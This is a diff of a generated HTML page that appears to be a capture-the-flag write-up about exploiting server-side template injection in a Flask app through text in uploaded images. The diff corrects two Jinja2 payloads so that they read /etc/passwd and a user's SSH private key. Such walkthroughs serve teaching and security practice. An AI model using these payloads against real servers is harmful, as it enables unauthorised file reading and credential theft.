@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.712715289681">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.712715412230">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 2.4.0">
@@ -32,12 +32,12 @@
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../../../resources/css/retype.css?v=2.4.0.712715289681" rel="stylesheet" />
+    <link href="../../../../resources/css/retype.css?v=2.4.0.712715412230" rel="stylesheet" />
 
-    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.4.0.712715289681" data-turbo-eval="false" defer></script>
+    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.4.0.712715412230" data-turbo-eval="false" defer></script>
     <script type="text/javascript" src="../../../../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.4.0.712715289681" data-turbo-eval="false" defer></script>
-    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.4.0.712715289681" defer></script>
+    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.4.0.712715412230" data-turbo-eval="false" defer></script>
+    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.4.0.712715412230" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -319,7 +319,7 @@ Now we upload image to the website.</p>
 </doc-anchor-target>
 <p>Moving to another level now, lets see if we can get the <code v-pre>/etc/passwd</code> file. Googling around we can find multiple web sites with Flask SSTI payloads, after trying a couple ones  I found <a href="https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e">this</a> one to be working:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-python"><code v-pre class="language-python">{ get_flashed_messages.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read() }</code></pre>
+<pre class="language-python"><code v-pre class="language-python">{{ get_flashed_messages.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read() }}</code></pre>
 </doc-codeblock></div>
 <p><em>While testing the SSTI payloads, I found out that some fonts works better than others, and we need to have a very clear screenshot of the payload. To circunvent this, I used <a href="https://www.figma.com">Figma</a> to create my screenshots.</em></p>
 <p><figure class="content-center">
@@ -377,8 +377,7 @@ smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
 </doc-codeblock></div>
 <p>Which seems to be an interesting user with a <code v-pre>home</code> and a bash tty. During the nmap scan we saw that the SSH port is open. Using a guessing game, we can try to retrieve the SSH private key for this user. The payload looks like this:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">{ get_flashed_messages.__globals__.__builtins__.open(&quot;/home/svc_acc/.ssh/id_rsa&quot;).read()  
-}</code></pre>
+<pre class="language-none"><code v-pre class="language-none">{{ get_flashed_messages.__globals__.__builtins__.open(&quot;/home/svc_acc/.ssh/id_rsa&quot;).read() }}</code></pre>
 </doc-codeblock></div>
 <p>I had to change the font to <code v-pre>Roboto</code> to make it work this time!
 And the image generated in Figma:
